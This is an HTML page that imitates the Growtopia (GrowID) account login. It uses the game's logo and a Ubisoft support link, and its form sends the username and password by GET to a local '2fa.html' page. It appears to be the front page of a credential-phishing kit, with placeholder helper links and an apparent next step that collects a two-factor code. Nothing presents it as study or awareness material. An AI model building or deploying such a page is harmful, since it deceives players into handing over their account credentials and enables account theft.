<!-- login.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Growtopia Account Login</title>
  <style>
    body { background: #f4f4f4; font-family: Arial, sans-serif; margin: 0; padding: 0; }
    .login-box { background: #fff; max-width: 350px; margin: 60px auto; padding: 20px; 
                 border: 1px solid #e0e0e0; border-radius: 4px; text-align: center; }
    .login-box img.logo { max-width: 200px; margin-bottom: 20px; }
    .login-box h2 { font-size: 18px; color: #333; margin-bottom: 15px; }
    .input-field { width: 90%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; 
                   border-radius: 3px; font-size: 14px; }
    .input-field:focus { border-color: #66afe9; outline: none; }
    .login-btn { width: 95%; padding: 10px; font-size: 16px; color: #fff; background: #337ab7; 
                 border: none; border-radius: 3px; cursor: pointer; }
    .login-btn:hover { background: #286090; }
    .helper-links { font-size: 12px; margin-top: 10px; }
    .helper-links a { color: #337ab7; text-decoration: none; }
    .helper-links a:hover { text-decoration: underline; }
    footer { font-size: 11px; color: #777; text-align: center; padding: 15px 5px; }
    footer a { color: #337ab7; text-decoration: none; margin: 0 5px; }
    footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/fr/e/e0/Growtopia_Logo.png" alt="Growtopia" class="logo">
    <h2>GrowID Login</h2>
    <form action="2fa.html" method="get">
      <input type="text" name="username" class="input-field" placeholder="GrowID" required><br>
      <input type="password" name="password" class="input-field" placeholder="Password" required><br>
      <button type="submit" class="login-btn">Login</button>
    </form>
    <div class="helper-links">
      <a href="#">Forgot Password?</a> | <a href="#">Create an Account</a>
    </div>
  </div>
  <footer>

    <a href="https://www.ubisoft.com/en-us/help/growtopia" target="_blank">Support</a>
  </footer>
</body>
</html>
